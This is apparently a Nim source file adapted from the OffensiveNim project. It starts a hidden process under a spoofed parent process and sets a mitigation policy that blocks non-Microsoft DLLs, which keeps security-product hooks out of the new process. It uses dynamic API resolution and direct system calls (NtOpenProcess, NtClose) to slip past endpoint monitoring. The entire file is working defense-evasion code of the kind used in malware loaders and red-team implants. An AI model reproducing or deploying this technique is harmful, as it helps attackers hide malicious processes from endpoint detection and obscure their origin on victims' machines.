#[
  References:
    https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/blockdlls_acg_ppid_spoof_bin.nim
    https://gist.github.com/khchen/5cd03eab742517fa20ccc688e6b1a1a6
]#

import nimvoke/syscalls
import nimvoke/dinvoke

from os import joinPath
from strutils import toLower
from winim/lean import DWORD, DWORD64, DWORD_PTR, SIZE_T, HANDLE, CLIENT_ID, MAX_PATH, WINBOOL, NULL, FALSE, NTSTATUS, LPCWSTR, LPWSTR, LPVOID,
                       OBJECT_ATTRIBUTES, STARTUPINFOEX, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_INFORMATION, SECURITY_ATTRIBUTES,
                       STARTF_USESHOWWINDOW, SW_HIDE, LPPROC_THREAD_ATTRIBUTE_LIST, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, PROCESS_ALL_ACCESS, 
                       PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, CREATE_NO_WINDOW, EXTENDED_STARTUPINFO_PRESENT, DETACHED_PROCESS, CREATE_SUSPENDED,
                       LPSECURITY_ATTRIBUTES, LPSTARTUPINFOW, LPPROCESS_INFORMATION, StartupInfo, InitializeProcThreadAttributeList, UpdateProcThreadAttribute, 
                       `T`, `&`, `$`, nullTerminated
from winim/inc/psapi import GetModuleBaseName, EnumProcessModules, EnumProcesses

converter nimIntTocint(x: int): cint = cint x

dinvokeDefine(
  CreateProcessW,
  "kernel32.dll",
  proc (lpApplicationName: LPCWSTR,
        lpCommandLine: LPWSTR,
        lpProcessAttributes: LPSECURITY_ATTRIBUTES,
        lpThreadAttributes: LPSECURITY_ATTRIBUTES,
        bInheritHandles: WINBOOL,
        dwCreationFlags: DWORD,
        lpEnvironment: LPVOID,
        lpCurrentDirectory: LPCWSTR,
        lpStartupInfo: LPSTARTUPINFOW,
        lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.stdcall.}
)

dinvokeDefine(
  HeapAlloc,
  "kernel32.dll",
  proc (hHeap: HANDLE, dwFlags: DWORD, dwBytes: SIZE_T): LPVOID {.stdcall.})

dinvokeDefine(GetProcessHeap, "kernel32.dll", proc (): HANDLE {.stdcall.})

proc findTargetProc*(targetProc: string): DWORD =
  var
    res: WINBOOL
    cbNeeded: DWORD
    hModule: HANDLE
    clientID: CLIENT_ID 
    hProcess: HANDLE 
    objectAttributes: OBJECT_ATTRIBUTES
    aProcesses: array[1337, DWORD]
    szProcessName = T(MAX_PATH)

  if EnumProcesses(&aProcesses[0], sizeof(aProcesses), &cbNeeded) != 0:
    for i in 0 ..< cbNeeded div sizeof(DWORD):
      clientID.UniqueProcess = cast[DWORD](aProcesses[i])
      var status: NTSTATUS = syscall(
        NtOpenProcess, &hProcess, PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, &objectAttributes, &clientID
      )

      if hProcess != 0:
        if EnumProcessModules(hProcess, &hModule, sizeof(hModule), &cbNeeded) != 0:
          GetModuleBaseName(hProcess, hModule, &szProcessName, MAX_PATH.cint)
          let procName = $szProcessName.nullTerminated
          if procName.toLower() == targetProc:
            return aProcesses[i]
        res = syscall(NtClose, hProcess)

const
  PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE = 0x00000003 shl 44 

proc startProc*(binPath: string, binName: string, parentProc: string): void =
  let binaryToLaunch = joinPath(binPath, binName)

  var
    res: WINBOOL
    hParent: HANDLE 
    policy: DWORD64
    lpSize: SIZE_T
    clientID: CLIENT_ID
    suInfo: STARTUPINFOEX
    procInfo: PROCESS_INFORMATION 
    objAttr: OBJECT_ATTRIBUTES
    pSecurityAttributes: SECURITY_ATTRIBUTES
    tSecurityAttributes: SECURITY_ATTRIBUTES

  suInfo.StartupInfo.cb = sizeof(suInfo).cint
  suInfo.StartupInfo.dwFlags = STARTF_USESHOWWINDOW 
  suInfo.StartupInfo.wShowWindow = SW_HIDE
  pSecurityAttributes.nLength = sizeof(pSecurityAttributes).cint 
  tSecurityAttributes.nLength = sizeof(tSecurityAttributes).cint

  policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE 

  InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
  suInfo.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
  InitializeProcThreadAttributeList(suInfo.lpAttributeList, 2, 0, addr lpSize)

  res = UpdateProcThreadAttribute(
    suInfo.lpAttributeList, 0, cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY), addr policy, sizeof(policy), NULL, NULL
  )

  var ppid = findTargetProc(parentProc)
  clientID.UniqueProcess = cast[DWORD](ppid)
  var status: NTSTATUS = syscall(NtOpenProcess, &hParent, PROCESS_ALL_ACCESS, &objAttr, &clientID)
  if status != 0: return 

  res = UpdateProcThreadAttribute(
    suInfo.lpAttributeList, 0, cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_PARENT_PROCESS), addr hParent, sizeof(hParent), NULL, NULL
  )

  res = CreateProcessW(
    NULL, 
    binaryToLaunch, 
    addr pSecurityAttributes, 
    addr tSecurityAttributes, 
    FALSE,
    CREATE_NO_WINDOW or EXTENDED_STARTUPINFO_PRESENT, 
    NULL, 
    NULL, 
    addr suInfo.StartupInfo, 
    addr procInfo
  )

  res = syscall(NtClose, hParent)